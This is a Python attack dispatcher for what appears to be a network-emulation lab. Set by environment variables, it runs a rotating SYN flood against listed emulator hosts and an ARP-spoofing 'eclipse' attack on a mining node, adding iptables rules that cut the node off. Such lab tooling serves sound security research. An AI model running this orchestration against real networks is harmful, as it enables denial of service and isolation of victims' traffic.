#!/usr/bin/env python3
"""
Attacker container startup / attack dispatcher.
Runs after the container has finished all other setup.

Controlled entirely via environment variables:
  SYNFLOOD=1         → run continuous SYN-flood against emulator hosts
  ECLIPSE_ARP=1      → run ARP-spoof eclipse attack against Node 162 (10.162.0.71)
                        and install iptables DROP rules to isolate it
"""

import subprocess
import datetime
import os
import random
import signal
import time

# ──────────────────────────────────────────────────────────────────────────────
# CONFIG
# ──────────────────────────────────────────────────────────────────────────────
SYNFLOOD_TARGETS = [
    # AS162 host traffic services
    ("10.162.0.71", 80),
    ("10.162.0.71", 23),
    ("10.162.0.71", 53),
    ("10.162.0.71", 8088),
    ("10.162.0.71", 8545),
    ("10.162.0.71", 30303),
    ("10.162.0.72", 80),
    ("10.162.0.72", 23),
    ("10.162.0.72", 53),
    ("10.162.0.72", 8545),
    ("10.162.0.72", 30303),
    ("10.162.0.73", 80),
    ("10.162.0.73", 23),
    ("10.162.0.73", 53),
    ("10.162.0.73", 8545),
    ("10.162.0.73", 30303),
    ("10.162.0.74", 80),
    ("10.162.0.74", 23),
    ("10.162.0.74", 53),
]
SYNFLOOD_RESTART_INTERVAL = 10   # seconds between target rotations
SYNFLOOD_PATH = "/synflood"

# Eclipse ARP attack targets (Node 162 victim + its gateway)
ECLIPSE_VICTIM_IP  = "10.162.0.71"   # Node 162 miner (victim)
ECLIPSE_GATEWAY_IP = "10.162.0.254"  # AS162 border router
ARP_SPOOF_PATH     = "/arp_spoof.py"

# iptables rules installed to block the victim's traffic after ARP poisoning
ECLIPSE_IPTABLES_RULES = [
    ["iptables", "-A", "FORWARD", "-s", ECLIPSE_VICTIM_IP, "-p", "tcp",
     "-j", "REJECT", "--reject-with", "tcp-reset"],
    ["iptables", "-A", "FORWARD", "-d", ECLIPSE_VICTIM_IP, "-p", "tcp",
     "-j", "REJECT", "--reject-with", "tcp-reset"],
    ["iptables", "-A", "FORWARD", "-s", ECLIPSE_VICTIM_IP, "-p", "udp", "-j", "DROP"],
    ["iptables", "-A", "FORWARD", "-d", ECLIPSE_VICTIM_IP, "-p", "udp", "-j", "DROP"],
]


# ──────────────────────────────────────────────────────────────────────────────
# LOGGING
# ──────────────────────────────────────────────────────────────────────────────
def log(message: str) -> None:
    timestamp = datetime.datetime.now().isoformat()
    print(f"[{timestamp}] {message}", flush=True)


# ──────────────────────────────────────────────────────────────────────────────
# PROCESS HELPERS
# ──────────────────────────────────────────────────────────────────────────────
def kill_process(proc: subprocess.Popen, name: str = "process") -> None:
    if proc.poll() is not None:
        return
    log(f"Stopping {name} pid={proc.pid}")
    proc.terminate()
    try:
        proc.wait(timeout=10)
    except subprocess.TimeoutExpired:
        log(f"{name} pid={proc.pid} did not stop, killing")
        proc.kill()
        proc.wait()


# ──────────────────────────────────────────────────────────────────────────────
# ENV-VAR FEATURE FLAGS
# ──────────────────────────────────────────────────────────────────────────────
def _flag(envvar: str) -> bool:
    return os.environ.get(envvar, "").strip().lower() in {"1", "true", "yes"}

def synflood_enabled()   -> bool: return _flag("SYNFLOOD")
def eclipse_arp_enabled() -> bool: return _flag("ECLIPSE_ARP")


# ──────────────────────────────────────────────────────────────────────────────
# SYNFLOOD
# ──────────────────────────────────────────────────────────────────────────────
def _run_synflood_once(target_ip: str, target_port: int) -> subprocess.Popen:
    log(f"Starting synflood against {target_ip}:{target_port}")
    return subprocess.Popen(
        [SYNFLOOD_PATH, target_ip, str(target_port)],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )


def synflood() -> None:
    if not os.path.exists(SYNFLOOD_PATH):
        log(f"Error: synflood binary not found at {SYNFLOOD_PATH}")
        return

    proc = _run_synflood_once(*random.choice(SYNFLOOD_TARGETS))

    def _handle(signum, frame):
        log(f"Received signal {signum}, shutting down synflood")
        kill_process(proc, "synflood")
        raise SystemExit(0)

    signal.signal(signal.SIGINT,  _handle)
    signal.signal(signal.SIGTERM, _handle)

    try:
        while True:
            time.sleep(SYNFLOOD_RESTART_INTERVAL)
            kill_process(proc, "synflood")
            proc = _run_synflood_once(*random.choice(SYNFLOOD_TARGETS))
    except KeyboardInterrupt:
        kill_process(proc, "synflood")
        log("Synflood shutdown complete")


# ──────────────────────────────────────────────────────────────────────────────
# ECLIPSE — ARP SPOOFING
# ──────────────────────────────────────────────────────────────────────────────
def _install_iptables_rules() -> None:
    """Install FORWARD DROP/REJECT rules that cut off the victim's traffic."""
    for rule in ECLIPSE_IPTABLES_RULES:
        log(f"iptables: {' '.join(rule)}")
        r = subprocess.run(rule, capture_output=True, text=True)
        if r.returncode != 0:
            log(f"  WARNING: iptables returned {r.returncode}: {r.stderr.strip()}")
        else:
            log("  iptables rule installed OK")


def _flush_iptables() -> None:
    """Remove all FORWARD rules (cleanup on exit)."""
    log("Flushing iptables FORWARD chain …")
    subprocess.run(["iptables", "-F", "FORWARD"], capture_output=True)
    subprocess.run(["iptables", "-F"],            capture_output=True)
    log("iptables flushed")


def _run_arp_spoof() -> subprocess.Popen:
    log(f"Starting ARP spoof ({ARP_SPOOF_PATH}): {ECLIPSE_VICTIM_IP} ↔ {ECLIPSE_GATEWAY_IP}")
    return subprocess.Popen(
        ["python3", "-u", ARP_SPOOF_PATH],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
    )


def eclipse_arp() -> None:
    """
    ARP-spoof eclipse attack:
      1. Start arp_spoof.py (poisons victim ↔ gateway ARP caches, runs forever)
      2. Install iptables FORWARD DROP rules to block traffic to/from victim
      3. Supervise arp_spoof — restart it if it dies unexpectedly
    """
    if not os.path.exists(ARP_SPOOF_PATH):
        log(f"Error: arp_spoof.py not found at {ARP_SPOOF_PATH}")
        return

    arp_proc = _run_arp_spoof()
    # Let ARP resolve MACs before installing iptables
    time.sleep(3)

    if arp_proc.poll() is not None:
        out = arp_proc.stdout.read() if arp_proc.stdout else ""
        log(f"ERROR: arp_spoof died immediately:\n{out}")
        return

    log(f"ARP spoof running (pid={arp_proc.pid})")
    _install_iptables_rules()
    log("Eclipse ARP attack active — victim is being isolated")

    def _handle(signum, frame):
        log(f"Received signal {signum}, cleaning up eclipse attack")
        kill_process(arp_proc, "arp_spoof")
        _flush_iptables()
        raise SystemExit(0)

    signal.signal(signal.SIGINT,  _handle)
    signal.signal(signal.SIGTERM, _handle)

    try:
        while True:
            # Stream any output from arp_spoof to our log
            if arp_proc.stdout:
                line = arp_proc.stdout.readline()
                if line:
                    log(f"[arp_spoof] {line.rstrip()}")
                    continue  # don't sleep, keep draining

            # Check if the subprocess died and restart it
            if arp_proc.poll() is not None:
                log(f"WARNING: arp_spoof exited (rc={arp_proc.returncode}), restarting …")
                time.sleep(2)
                arp_proc = _run_arp_spoof()
                time.sleep(3)
                log(f"arp_spoof restarted (pid={arp_proc.pid})")
            else:
                time.sleep(0.5)
    except KeyboardInterrupt:
        kill_process(arp_proc, "arp_spoof")
        _flush_iptables()
        log("Eclipse ARP shutdown complete")


# ──────────────────────────────────────────────────────────────────────────────
# MAIN
# ──────────────────────────────────────────────────────────────────────────────
def main() -> None:
    import socket
    hostname = socket.gethostname()
    log(f"Attacker node '{hostname}' attack dispatcher starting")

    active = []

    if synflood_enabled():
        log("SYNFLOOD enabled")
        active.append("synflood")
    else:
        log("SYNFLOOD disabled (set SYNFLOOD=1 to enable)")

    if eclipse_arp_enabled():
        log("ECLIPSE_ARP enabled")
        active.append("eclipse_arp")
    else:
        log("ECLIPSE_ARP disabled (set ECLIPSE_ARP=1 to enable)")

    if not active:
        log("No attacks enabled — idling")
        # Keep the process alive so the container stays up
        def _idle_exit(signum, frame):
            raise SystemExit(0)
        signal.signal(signal.SIGTERM, _idle_exit)
        signal.signal(signal.SIGINT,  _idle_exit)
        while True:
            time.sleep(60)
        return

    # Only one attack can own signal handlers, so we run the "dominant" one
    # in the foreground. If both are enabled, run each in a thread.
    if len(active) == 1:
        if "synflood" in active:
            synflood()
        else:
            eclipse_arp()
    else:
        import threading
        threads = []
        if "synflood" in active:
            threads.append(threading.Thread(target=synflood, daemon=True))
        if "eclipse_arp" in active:
            threads.append(threading.Thread(target=eclipse_arp, daemon=True))
        for t in threads:
            t.start()
        for t in threads:
            t.join()


if __name__ == "__main__":
    main()
